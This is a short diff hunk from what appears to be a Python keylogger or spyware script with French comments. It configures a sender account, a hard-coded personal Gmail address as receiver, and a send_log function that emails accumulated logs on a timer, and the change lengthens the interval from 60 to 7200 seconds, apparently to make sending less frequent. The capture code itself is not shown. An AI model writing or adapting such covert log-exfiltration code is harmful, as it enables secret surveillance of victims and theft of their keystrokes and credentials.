@@ -13,7 +13,7 @@ password = ""  # Remplace par ton mot de passe
 sender_email = username
 receiver_email = "rakotoarivonyalifera27@gmail.com"
 log = ""
-interval = 60  # Intervalle en secondes pour envoyer les logs
+interval = 7200  # Intervalle en secondes pour envoyer les logs
 
 # Fonction pour envoyer les logs par email
 def send_log():
